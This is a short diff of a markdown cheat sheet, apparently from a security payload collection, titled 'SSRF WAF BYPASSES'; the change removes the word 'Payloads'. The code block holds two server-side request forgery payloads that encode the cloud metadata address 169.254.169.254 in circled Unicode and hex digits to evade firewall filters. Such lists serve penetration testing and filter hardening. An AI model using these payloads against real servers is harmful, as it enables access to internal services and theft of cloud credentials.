@@ -1,7 +1,7 @@
 SSRF WAF BYPASSES [tweet](https://twitter.com/aisecureme/status/1238061828229353473) By [AISECUREME](https://twitter.com/aisecureme)
 
 ![SSRF](Images/ssrf.png)
-Payloads
+
 ```
 http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
 http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
